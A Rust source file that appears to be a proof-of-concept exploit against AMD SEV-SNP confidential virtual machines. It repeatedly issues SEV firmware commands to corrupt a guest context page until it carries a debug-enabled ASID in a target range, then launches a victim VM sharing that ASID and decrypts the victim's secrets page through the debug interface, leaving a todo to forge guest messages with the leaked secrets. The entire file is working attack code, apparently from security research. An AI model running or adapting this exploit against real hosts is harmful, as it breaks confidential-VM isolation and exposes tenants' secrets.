use std::{collections::HashSet, io::stdout, io::Write, ops::Range};

use anyhow::{Context, Result};

use bit_field::BitField;
use kvm::KvmHandle;
use raw_cpuid::CpuId;
use time::{
    convert::{Day, Hour, Minute, Second},
    Instant,
};
use x86_64::{structures::paging::PhysFrame, PhysAddr};

use crate::{
    kvm::{Page, SevHandle, VmHandle},
    slot::Slot,
    snp_types::{GuestPolicy, PageType, VmplPermissions},
};

mod kvm;
mod slot;
mod snp_types;

fn main() -> Result<()> {
    let handles = Handles::new()?;
    let attacker_vm = handles.corrupt_gctx()?;
    handles.attack(attacker_vm)?;

    Ok(())
}

struct Handles {
    kvm_handle: KvmHandle,
    sev_handle: SevHandle,
    vms: Vec<VmHandle>,
}

impl Handles {
    pub fn new() -> Result<Self> {
        let kvm_handle = KvmHandle::new()?;

        let sev_handle = SevHandle::new()?;
        sev_handle.sev_pdh_gen()?;

        // We can corrupt up to three guest context pages at a time.
        let mut vms = Vec::new();
        for _ in 0..3 {
            let vm = kvm_handle.create_snp_vm()?;
            vm.sev_snp_init()?;
            vm.sev_snp_launch_start(GuestPolicy::new(1, 55).with_allow_smt(true), &sev_handle)?;
            vm.sev_snp_launch_finish(&sev_handle, [0; 32])?;
            vms.push(vm);
        }

        Ok(Self {
            kvm_handle,
            sev_handle,
            vms,
        })
    }

    /// Corrupt a guest context page, so that it points to a different valid
    /// ASID.
    pub fn corrupt_gctx(&self) -> Result<&VmHandle> {
        let start = Instant::now();

        let asid_bounds = asid_bounds()?;
        println!("Corrupt guest context page so that ASID is in range {asid_bounds:?}");

        let mut stdout = stdout();

        let mut min = !0;
        let mut i = 0u64;
        let mut zeros = 0u64;
        let mut unique_asids = HashSet::new();

        loop {
            i += 1;
            let mut print = i % 100 == 0;

            let mut found = None;

            self.sev_handle.sev_pdh_gen()?;
            for vm in self.vms.iter() {
                let status = vm.sev_snp_guest_status()?;

                let is_active = status.asid != 0;
                let allow_debugging = status.policy.get_bit(19);
                if is_active {
                    unique_asids.insert(status.asid);
                    if allow_debugging {
                        if status.asid < min {
                            min = status.asid;
                            print = true;
                        }
                        if asid_bounds.contains(&status.asid) {
                            found = Some(vm);
                            print = true;
                        }
                    }
                } else {
                    zeros += 1;
                }
            }

            if print {
                let elapsed = start.elapsed();
                let seconds = elapsed.whole_seconds().unsigned_abs();
                let days = seconds / Second::per(Day) as u64;
                let hours = seconds / Second::per(Hour) as u64 % Hour::per(Day) as u64;
                let minutes = seconds / Second::per(Minute) as u64 % Minute::per(Hour) as u64;
                let seconds = seconds % Second::per(Minute) as u64;

                write!(stdout, "\rSmallest ASID: {min:#010x} iterations: {i} zeros: {zeros} unique asids: {} elapsed time: {days}d {hours:02}h {minutes:02}m {seconds:02}s", unique_asids.len())?;
                stdout.flush()?;
            }

            if let Some(victim_asid) = found {
                println!();
                break Ok(victim_asid);
            }
        }
    }

    /// Use the corrupted guest context page to attack another VM.
    fn attack(&self, attacker_vm: &VmHandle) -> Result<(), anyhow::Error> {
        println!("Creating VM with same ASID");

        let status = attacker_vm.sev_snp_guest_status()?;
        let asid = status.asid;

        loop {
            // Launch a SNP VM whose memory we will decrypt.
            let vm = self.kvm_handle.create_snp_vm()?;
            vm.sev_snp_init()?;
            vm.sev_snp_launch_start(
                GuestPolicy::new(1, 55).with_allow_smt(true),
                &self.sev_handle,
            )?;
            let gpa = PhysFrame::containing_address(PhysAddr::new(0x1000));
            let slot = Slot::for_launch_update(&vm, gpa, &[Page::ZERO])
                .context("failed to create slot for launch update")?;
            unsafe {
                vm.map_encrypted_memory(1, &slot)?;
            }
            vm.sev_snp_launch_update(
                gpa.start_address().as_u64(),
                u64::try_from(slot.shared_mapping().as_ptr().as_ptr() as usize)?,
                u32::try_from(slot.shared_mapping().len().get())?,
                PageType::Secrets,
                VmplPermissions::empty(),
                &self.sev_handle,
            )?;
            vm.sev_snp_launch_finish(&self.sev_handle, [0; 32])?;

            // Check that the VM has the same ASID as our correupted guest
            // context page.
            let status = vm.sev_snp_guest_status()?;
            if status.asid != asid {
                // Leak the VM, so that we don't see its ASID again and try
                // again.
                core::mem::forget(vm);
                continue;
            }

            // Decrypt the last launched secrets page.
            let bytes = attacker_vm.sev_snp_dbg_decrypt_pfn()?;
            println!("{bytes:02x?}");

            todo!("use the leaked secrets to send guest messages");
        }
    }
}

/// Determine the range of valid ASIDs for SEV-SNP.
fn asid_bounds() -> Result<Range<u32>> {
    let cpuid = CpuId::new();
    let info = cpuid
        .get_memory_encryption_info()
        .filter(|info| info.has_sev_snp())
        .context("SEV-SNP is not supported by the CPU")?;
    Ok(1..info.min_sev_no_es_asid())
}
